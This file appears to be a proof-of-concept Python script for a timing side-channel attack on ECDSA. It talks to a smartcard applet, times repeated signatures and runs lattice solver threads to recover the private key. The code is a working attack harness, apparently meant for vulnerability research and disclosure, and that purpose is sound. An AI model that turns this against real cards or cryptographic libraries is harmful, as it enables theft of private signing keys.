#!/usr/bin/env python3

import argparse
import hashlib
import json
import sys
import time
from binascii import hexlify
from bisect import bisect
from datetime import timedelta
from multiprocessing import Queue, Event, Process
from pprint import pprint
from queue import Empty

from asn1crypto.core import Sequence
from smartcard.System import readers
from smartcard.pcsc.PCSCCardConnection import translateprotocolheader
from smartcard.scard import SCardTransmit

from attack import construct_signature, DEFAULT_PARAMS, Solver
from ec import get_curve

SELECT = [0x00, 0xa4, 0x04, 0x00, 0x0f, 0x4d, 0x69, 0x6e, 0x65, 0x72, 0x76, 0x61, 0x2d, 0x70, 0x6f,
          0x63, 0x2e, 0x63, 0x61, 0x70]
PREPARE = [0xb0, 0x5a, 0x00, 0x00]
SIGN = [0xb0, 0x5b, 0x00, 0x00]

solution_found = Event()
signature_queue = Queue()


def collect_signatures(connection, output, finish):
    """Collect signatures from the card and output, until finish."""
    card = connection.component.hcard
    proto = translateprotocolheader(connection.component.getProtocol())
    i = 0
    while not finish(i):
        elapsed = -time.perf_counter_ns()
        result = SCardTransmit(card, proto, SIGN)
        elapsed += time.perf_counter_ns()
        resp = [(x + 256) % 256 for x in result[1][:-2]]
        output(i, elapsed, bytes(resp))
        i += 1


def connect():
    """Connect to and select the applet on the card in the first reader."""
    try:
        reader = readers()[0]
    except Exception as e:
        print("[x] Couldn't initialize a reader: {}".format(e))
        return None
    connection = reader.createConnection()
    connection.connect()
    print("[*] Connected to card: {:x} in {}.".format(
            int.from_bytes(bytes(connection.getATR()), byteorder="big"), str(reader)))
    resp, sw1, sw2 = connection.transmit(SELECT)
    if sw1 == 0x90 and sw2 == 0:
        print("[*] Selected applet.", file=sys.stderr)
        return connection
    else:
        print("[x] Couldn't select applet: {:02x}{:02x}".format(sw1, sw2))
        return None


def prepare(connection):
    """Prepare for signature collection by generating a new keypair."""
    resp, sw1, sw2 = connection.transmit(PREPARE)
    x = int.from_bytes(bytes(resp[1:33]), byteorder="big")
    y = int.from_bytes(bytes(resp[33:65]), byteorder="big")
    raw = bytes(resp[:65])
    pubkey = (x, y)
    data = bytes(resp[65:])
    print("[*] Generated ECDSA keypair, public key:", pubkey, ", data:", hexlify(data).decode())
    return raw, pubkey, data


def attack(curve, hash, data, pubkey, params):
    """Wait for signatures to come in and start attack threads."""
    signatures = []
    threads = {}

    skip = params["attack"]["skip"]
    if skip != 0:
        print("[ ] Skipping {} signatures.".format(skip))
        for _ in range(skip):
            signature_queue.get()
    thread_start = time.time()
    while True:
        while True:
            try:
                if not signatures:
                    elapsed, resp = signature_queue.get()
                    thread_start = time.time()
                else:
                    elapsed, resp = signature_queue.get_nowait()
                try:
                    r, s = Sequence.load(resp).native.values()
                except ValueError:
                    print("[x] Failed to parse signature:", hexlify(resp), file=sys.stderr)
                    continue
                sig = construct_signature(curve, hash, data, r, s, elapsed)
                ind = bisect(signatures, sig)
                signatures.insert(ind, sig)
            except Empty:
                break
        if solution_found.is_set():
            return
        threads = {n: thread for n, thread in threads.items() if thread.is_alive()}
        if len(signatures) >= params["attack"]["start"] and \
                len(threads) < params["max_threads"] and \
                len(signatures) not in threads and \
                (not threads or max(threads.keys()) < len(signatures) - params["attack"]["step"]):
            thread_name = str(len(signatures))
            print("[ ] Starting attack thread {}.".format(thread_name))
            sub_sigs = list(signatures[:params["dimension"]])
            solution = lambda skey: solution_found.set()
            solve_thread = Solver(curve, sub_sigs, pubkey, params, solution)
            solve_thread.name = thread_name
            solve_thread.daemon = True
            threads[len(signatures)] = solve_thread
            solve_thread.start()

        if len(signatures) > 1:
            print("[ ] Have {} signatures, {:.02f}/s.".format(len(signatures), len(signatures) / (
                    time.time() - thread_start)))
        time.sleep(10)


def parse_params(fname):
    with open(fname) as f:
        return json.load(f)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--params", help="A JSON file specifying attack parameters.",
                        dest="params", type=parse_params, default=DEFAULT_PARAMS)

    args = parser.parse_args()

    curve = get_curve("secp256r1")
    hash = hashlib.new("sha256")

    print("[*] Using parameters:")
    pprint(args.params)
    print("[*] Attack type is ignored, this PoC performs a fixed attack, "
          "using all collected signatures as they are being collected.")

    connection = connect()
    if connection is None:
        exit(1)
    raw, pub, data = prepare(connection)
    pubkey = curve.decode_point(raw)

    output = lambda i, elapsed, resp: signature_queue.put((elapsed, resp))
    finish = lambda i: solution_found.is_set()

    print("[ ] Starting attack.")
    elapsed = -time.time()
    collect = Process(target=collect_signatures, args=(connection, output, finish))
    attack = Process(target=attack, args=(curve, hash, data, pubkey, args.params))
    collect.start()
    attack.start()
    attack.join()
    collect.join()
    elapsed += time.time()
    print("[*] Finished attack, time elapsed: {}.".format(timedelta(seconds=round(elapsed, 2))))
